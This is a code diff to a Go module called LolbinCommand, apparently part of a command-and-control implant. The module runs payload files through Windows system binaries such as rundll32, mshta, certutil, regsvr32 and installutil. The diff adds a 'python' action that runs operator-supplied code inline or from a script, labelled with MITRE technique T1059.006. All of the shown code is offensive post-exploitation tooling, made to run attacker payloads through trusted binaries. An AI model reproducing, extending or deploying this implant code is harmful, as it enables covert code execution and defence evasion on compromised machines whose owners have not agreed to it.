@@ -43,8 +43,15 @@ func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action is required (rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil)")
+		return errorResult("Error: action is required (rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua, python)")
 	}
+
+	// Script interpreter actions handle path differently (inline code vs file)
+	switch args.Action {
+	case "python":
+		return lolbinPython(args.Path, args.Args)
+	}
+
 	if args.Path == "" {
 		return errorResult("Error: path to payload file is required")
 	}
@@ -80,7 +87,7 @@ func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
 	case "lua":
 		return lolbinLua(absPath, args.Args)
 	default:
-		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua)", args.Action)
+		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua, python)", args.Action)
 	}
 }
 
@@ -397,6 +404,55 @@ func lolbinLua(scriptPath, extraArgs string) structs.CommandResult {
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] Lua execution via %s\n    Script: %s\n", interpreter, scriptPath)
+	if len(output) > 0 {
+		result += string(output)
+	}
+	if ctx.Err() == context.DeadlineExceeded {
+		result += "\n[!] Process killed after timeout"
+	} else if err != nil {
+		result += fmt.Sprintf("\nProcess exited: %v", err)
+	}
+
+	return successResult(result)
+}
+
+// python — T1059.006 — Execute Python code inline or from script file
+func lolbinPython(code, extraArgs string) structs.CommandResult {
+	// Search for Python interpreters
+	var interpreter string
+	for _, name := range []string{"python3", "python", "python3.exe", "python.exe"} {
+		if p, err := exec.LookPath(name); err == nil {
+			interpreter = p
+			break
+		}
+	}
+	if interpreter == "" {
+		return errorResult("Error: python3/python not found on this system")
+	}
+
+	if code == "" && extraArgs == "" {
+		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
+	}
+
+	var cmdArgs []string
+	if code != "" {
+		// Inline execution: python -c "code"
+		cmdArgs = []string{"-c", code}
+		if extraArgs != "" {
+			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+		}
+	} else {
+		// Script file execution: python script.py [args]
+		cmdArgs = strings.Fields(extraArgs)
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
+	output, err := cmd.CombinedOutput()
+
+	result := fmt.Sprintf("[+] Python execution via %s\n    %s %s\n", interpreter, interpreter, strings.Join(cmdArgs, " "))
 	if len(output) > 0 {
 		result += string(output)
 	}
